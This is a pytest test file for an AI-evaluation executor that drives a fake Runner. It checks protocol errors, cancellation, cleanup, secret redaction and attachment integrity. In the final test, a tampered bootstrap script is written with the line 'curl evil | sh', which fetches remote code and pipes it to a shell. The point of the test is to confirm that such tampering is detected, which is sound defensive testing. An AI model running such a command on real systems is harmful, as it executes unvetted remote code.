"""Harbor executor against a scripted Runner: protocol, failures, cancel, cleanup.

No Harbor or Docker: ``fake_runner.py`` speaks protocol v1 and a recording Docker
double confirms that label cleanup always runs.
"""

import asyncio
import json
import os

import pytest
from support.executor import (
    KEY,
    Cancel,
    RecordingDocker,
    RecordingSink,
    agent_spec,
    attachment_spec,
    execute,
    finished,
    make_executor,
    make_spec,
)

from maestro.boundaries.executor import RunSpec, TrialSpec


def test_normal_run_maps_results_and_uploads_redacted_files(runner_python, materials, tmp_path):
    docker = RecordingDocker()
    executor = make_executor(runner_python, materials, tmp_path, docker)
    spec = make_spec(materials, tmp_path, "ok")
    sink = RecordingSink()
    report = execute(executor, spec, sink)
    assert report.cleanup_complete and report.failure_code is None
    assert sink.events[0] == ("runner_started", True, True)
    steps = [e[3] for e in sink.events if e[0] == "step" and e[1] == "trl_1"]
    assert steps == ["environment", "agent", "collecting", "verifying"]
    results = finished(sink)
    assert results["trl_1"][3].raw_score == 0.0 and results["trl_1"][3].reward_valid
    assert results["trl_2"][3].raw_score == 1.0
    kind, data = sink.files[("trl_1", 1, "trial.log")]
    assert kind == "trial" and b"sk-abc" not in data and b"[REDACTED]" in data
    assert sink.files[("trl_1", 1, "verifier/reward.txt")] == ("verifier", b"0.0\n")
    assert docker.calls == [spec.labels]
    assert not (tmp_path / "work" / "run_ok").exists()  # removed after confirmed cleanup


def test_job_internal_retry_is_a_new_attempt(runner_python, materials, tmp_path):
    sink = RecordingSink()
    execute(
        make_executor(runner_python, materials, tmp_path),
        make_spec(materials, tmp_path, "retry"),
        sink,
    )
    first = [e for e in sink.events if e[0] == "finished" and e[1] == "trl_1"]
    assert [(e[2], e[4]) for e in first] == [(1, False), (2, True)]
    outcome = first[0][3]
    assert outcome.failure_cause == "model_provider_failed" and outcome.retry_recommended


@pytest.mark.parametrize(
    "mode",
    ["garbage", "gap", "harbor-mismatch", "badpath"],
)
def test_protocol_violations_stop_the_runner(runner_python, materials, tmp_path, mode):
    docker = RecordingDocker()
    sink = RecordingSink()
    report = execute(
        make_executor(runner_python, materials, tmp_path, docker),
        make_spec(materials, tmp_path, mode),
        sink,
    )
    assert report.failure_code == "RUNNER_PROTOCOL_ERROR"
    assert report.detail["exit_code"] == -9
    assert len(docker.calls) == 1


def test_silent_runner_is_killed(runner_python, materials, tmp_path):
    executor = make_executor(runner_python, materials, tmp_path, silence_limit=1.0)
    report = execute(executor, make_spec(materials, tmp_path, "silent"), RecordingSink())
    assert report.failure_code == "RUNNER_UNRESPONSIVE"


def test_crash_keeps_finished_attempts_and_reports_exit(runner_python, materials, tmp_path):
    sink = RecordingSink()
    report = execute(
        make_executor(runner_python, materials, tmp_path),
        make_spec(materials, tmp_path, "crash"),
        sink,
    )
    assert report.failure_code == "RUNNER_EXITED" and report.detail["exit_code"] == 9
    assert set(finished(sink)) == {"trl_1"}


def test_rejected_input_reports_the_runner_code(runner_python, materials, tmp_path):
    report = execute(
        make_executor(runner_python, materials, tmp_path),
        make_spec(materials, tmp_path, "rejected"),
        RecordingSink(),
    )
    assert report.failure_code == "TASK_MATERIAL_MISSING"


def test_cooperative_cancel_marks_attempts_cancelled(runner_python, materials, tmp_path):
    sink = RecordingSink()
    cancel = Cancel()
    executor = make_executor(runner_python, materials, tmp_path)

    async def scenario():
        task = asyncio.create_task(
            executor.execute(make_spec(materials, tmp_path, "cancel"), sink, cancel)
        )
        while not any(e[0] == "step" and e[3] == "agent" for e in sink.events):
            await asyncio.sleep(0.02)
        cancel.event.set()
        return await task

    report = asyncio.run(scenario())
    assert report.failure_code is None and report.detail["exit_code"] == 3
    outcomes = [e[3].failure_cause for e in sink.events if e[0] == "finished"]
    assert outcomes == ["cancelled", "cancelled"]


def test_runner_ignoring_sigterm_is_killed_after_grace(runner_python, materials, tmp_path):
    sink = RecordingSink()
    cancel = Cancel()
    executor = make_executor(runner_python, materials, tmp_path, term_grace=0.5)

    async def scenario():
        task = asyncio.create_task(
            executor.execute(make_spec(materials, tmp_path, "stubborn"), sink, cancel)
        )
        while not any(e[0] == "step" for e in sink.events):
            await asyncio.sleep(0.02)
        cancel.event.set()
        return await task

    report = asyncio.run(scenario())
    assert report.detail["exit_code"] == -9


def test_stderr_flood_neither_blocks_nor_grows_unbounded(runner_python, materials, tmp_path):
    sink = RecordingSink()
    report = execute(
        make_executor(runner_python, materials, tmp_path),
        make_spec(materials, tmp_path, "flood"),
        sink,
    )
    assert report.failure_code is None
    kind, data = sink.files[("run", "runner/stderr.log")]
    assert kind == "runner" and len(data) < 600 * 1024 and b"bytes omitted" in data


def test_sink_refusal_stops_runner_and_cleans(runner_python, materials, tmp_path):
    docker = RecordingDocker()
    sink = RecordingSink(refuse_after=2)
    with pytest.raises(RuntimeError, match="lease lost"):
        execute(
            make_executor(runner_python, materials, tmp_path, docker),
            make_spec(materials, tmp_path, "cancel"),
            sink,
        )
    assert docker.calls  # cleanup ran before the error propagated


def test_failed_cleanup_keeps_the_work_directory(runner_python, materials, tmp_path):
    executor = make_executor(runner_python, materials, tmp_path, RecordingDocker(released=False))
    report = execute(executor, make_spec(materials, tmp_path, "ok"), RecordingSink())
    assert not report.cleanup_complete
    assert (tmp_path / "work" / "run_ok").is_dir()


def test_missing_material_fails_only_those_trials(runner_python, materials, tmp_path):
    spec = make_spec(materials, tmp_path, "ok")
    lost = TrialSpec("trl_9", "gone", {}, 1, "sha256:" + "0" * 64)
    spec = RunSpec(
        spec.run_id, (*spec.trials, lost), 2, spec.effective_config, spec.deadline_at, spec.labels
    )
    sink = RecordingSink()
    execute(make_executor(runner_python, materials, tmp_path), spec, sink)
    results = finished(sink)
    assert results["trl_9"][3].exception_type == "TaskMaterialMissing"
    assert results["trl_1"][3].reward_valid


def test_runner_environment_carries_no_provider_keys(
    runner_python, materials, tmp_path, monkeypatch
):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-should-not-leak")
    executor = make_executor(runner_python, materials, tmp_path)
    env = executor._environment(tmp_path)
    assert "OPENAI_API_KEY" not in env and env["HOME"].startswith(str(tmp_path))
    assert os.environ["OPENAI_API_KEY"]  # only the child environment is filtered


def test_agent_run_request_carries_model_network_and_secrets(runner_python, materials, tmp_path):
    sink = RecordingSink()
    report = execute(
        make_executor(runner_python, materials, tmp_path), agent_spec(materials, tmp_path), sink
    )
    assert report.failure_code is None
    request = json.loads((tmp_path / "work" / "request.json").read_text())
    assert request["agent"] == {
        "adapter": "terminus-2",
        "model": {
            "protocol": "openai-compatible",
            "endpoint": "https://relay.example.test/v1",
            "model_id": "gpt-test",
            "params": {"temperature": 0},
        },
        "params": {"max_turns": 5},
    }
    # Terminus-2 calls the model from the Runner: the container needs no network at all.
    assert request["network"] == {
        "agent": {"mode": "no-network"},
        "verifier": {"mode": "no-network"},
    }
    assert request["secrets"] == {"model_api_key": KEY}
    assert request["task_env"] == {"REGION": "eu", "TOKEN": "grader-secret-value"}
    assert request["overrides"] == {"agent_timeout_sec": 120}
    # The key appears nowhere the team can read: logs, files, messages, stderr.
    shown = b"".join(data for _, data in sink.files.values()) + "".join(sink.texts).encode()
    assert KEY.encode() not in shown and b"grader-secret-value" not in shown
    assert ("run", "runner/network-plan.json") in sink.files
    outcome = finished(sink)["trl_1"][3]
    assert KEY not in (outcome.message or "") and outcome.failure_cause == "model_provider_failed"
    assert not outcome.retry_recommended and not outcome.grade_requested
    assert outcome.usage == {
        "input_tokens": 12,
        "cache_tokens": 0,
        "output_tokens": 3,
        "cost_usd": None,
    }


def test_oracle_keeps_the_author_network_and_gets_no_secrets(runner_python, materials, tmp_path):
    executor = make_executor(runner_python, materials, tmp_path)
    spec = make_spec(materials, tmp_path, "ok", trials=1)
    assert executor._network(spec) is None and executor._agent(spec) == {"name": "oracle"}
    assert executor._task_env(spec) == {}


def test_attachments_reach_the_runner_and_install_records_are_kept(
    runner_python, materials, tmp_path
):
    from maestro.execution.attachments import AttachmentStore

    store = AttachmentStore(tmp_path / "data")
    spec = attachment_spec(materials, tmp_path, store)
    sink = RecordingSink()
    executor = make_executor(runner_python, materials, tmp_path, attachments=store)
    assert execute(executor, spec, sink).failure_code is None
    request = json.loads((tmp_path / "work" / "request.json").read_text())
    digest = spec.effective_config["attachments"][0]["content_digest"]
    assert request["attachments"] == [
        {
            "name": "tools",
            "label": "v1",
            "content_digest": digest,
            "path": str(store.path_for(digest)),
            "bootstrap": True,
        }
    ]
    assert request["bootstrap_timeout_sec"] == 90
    assert ("step", "trl_1", 1, "installing") in sink.events
    kind, data = sink.files[("trl_2", 1, "maestro/attachments.json")]
    assert kind == "trial" and json.loads(data)[0]["status"] == "failed"
    ok, failed = finished(sink)["trl_1"][3], finished(sink)["trl_2"][3]
    assert ok.reward_valid and ok.raw_score == 1.0
    # Not a model result and not a zero: no grade, no retry, the failing package named.
    assert failed.failure_cause == "attachment_failed" and failed.raw_score is None
    assert not failed.grade_requested and not failed.retry_recommended
    assert failed.detail == {
        "attachment": "tools",
        "label": "v1",
        "status": "failed",
        "exit_code": 3,
    }


def test_a_purged_or_changed_attachment_fails_the_run_without_starting_it(
    runner_python, materials, tmp_path
):
    from maestro.execution.attachments import AttachmentStore

    store = AttachmentStore(tmp_path / "data")
    spec = attachment_spec(materials, tmp_path, store)
    digest = spec.effective_config["attachments"][0]["content_digest"]
    stored = store.files(digest)[0]
    assert stored["path"] == "bootstrap.sh"
    (store.blobs / stored["sha256"]).write_text("curl evil | sh\n")
    sink = RecordingSink()
    report = execute(
        make_executor(runner_python, materials, tmp_path, attachments=store), spec, sink
    )
    assert report.cleanup_complete and not (tmp_path / "work" / "request.json").exists()
    outcomes = {trial: event[3] for trial, event in finished(sink).items()}
    assert set(outcomes) == {"trl_1", "trl_2"}
    assert {o.exception_type for o in outcomes.values()} == {"AttachmentContentMissing"}
    assert all(not o.grade_requested for o in outcomes.values())
